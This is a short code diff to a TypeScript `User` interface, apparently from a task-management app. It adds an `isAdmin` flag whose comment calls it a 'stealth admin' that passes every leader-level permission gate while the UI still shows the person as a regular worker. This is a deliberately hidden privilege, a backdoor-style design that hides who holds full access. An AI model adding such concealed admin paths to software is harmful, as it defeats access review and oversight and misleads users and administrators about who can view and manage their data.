@@ -17,6 +17,11 @@ export interface User {
   dailyCapacity: number;
   throughput: Record<string, number>;
   avatarUrl?: string;
+  // Stealth admin: passes every leader-equivalent permission gate
+  // (canManageTask, canViewTask, etc.) without changing what the UI
+  // shows for `role`. Used for a builder who needs full access while
+  // appearing as a regular worker. Default false.
+  isAdmin?: boolean;
 }
 
 export interface Department {
